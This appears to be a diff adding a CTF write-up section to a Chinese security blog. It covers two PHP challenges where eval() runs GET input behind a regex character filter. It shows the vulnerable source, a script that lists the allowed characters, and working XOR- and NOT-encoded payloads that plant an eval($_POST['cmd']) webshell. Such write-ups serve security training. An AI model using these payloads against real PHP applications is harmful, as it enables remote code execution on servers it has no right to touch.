@@ -70,6 +70,46 @@
 <p>将<code>+</code>URL编码后传参</p>
 <p><img src="https://note.youdao.com/yws/api/personal/file/WEBa7a1cd941f80e61c1912dcd721aa5ab4?method=download&shareKey=273bdb5d65efbd7dfe9b6026865b8a52"></p>
 <p><strong>ps:第三种方法虽然可行，但构造起来比前两周麻烦很多</strong></p>
+<h2 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><ul>
+<li><p>题目源码，通过正则匹配把很多字符都过滤了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>用脚本跑出可用字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allow = [];</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">255</span>; $i++)&#123;</span><br><span class="line">    $string =chr($i);</span><br><span class="line">    <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $string))&#123;</span><br><span class="line">        $allow[$i]=$string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($allow);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBdfc7239d8654e6f3271b86f2d2762bfe?method=download&shareKey=51fc49842f489e1def94e36f7f47950e"></p>
+</li>
+<li><p>看一下php版本，确定用异或绕过</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBfd5c0b072ad3a02b9445e529fcac9e59?method=download&shareKey=aa94fdd7053231badc372e8f8696c901"></p>
+</li>
+<li><p>构造webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%f1&#125;($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%f2&#125;);&amp;%f1=assert&amp;%f2=<span class="keyword">eval</span>($_POST[%<span class="number">27</span>cmd%<span class="number">27</span>])</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%f1&#125;($&#123;_GET&#125;&#123;%f2&#125;);&amp;%f1=assert&amp;%f2=eval($_POST[%27cmd%27])</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>蚁剑连接成功，拿到flag</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb64562fac3543b642017004e9679f37f?method=download&shareKey=78cbe1f5ed448a7e7629204bd16dde3c"></p>
+</li>
+</ul>
+<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><ul>
+<li><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">              <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>同样用脚本跑可用字符,<code>^</code>被过滤，只能用<code>~</code>取反绕过</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBa1ab53320caba223a54c5567d81094f2?method=download&shareKey=edf7602edf349e413dd72c41367efa44"></p>
+</li>
+<li><p>php7,可以用取反</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc557b8f55a8b64c55bc664444e3b98c5?method=download&shareKey=ad3abecc8d4e23b1ee282450ad696e91"></p>
+</li>
+<li><p>构造webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">9</span>C%<span class="number">92</span>%<span class="number">9</span>B%A2%D6%D6)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>蚁剑连接成功，拿到flag</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBefebac20a3f8a7655f5944318f518db9?method=download&shareKey=277ce2cbc73c7cbe4d642a0766fd6eb5"></p>
+</li>
+</ul>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/20/%E6%B5%B7%E5%95%B8%E6%9D%AFwriteup/">海啸杯writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-20</time><div class="content"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h2><ul>
 <li><p>图片一看长和宽比例就不太对<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb5aa0929994ab05abbbc7fc426dcf855?method=download&shareKey=136092033ea6928ee0a371d2ae6a26bd"></p>
 </li>
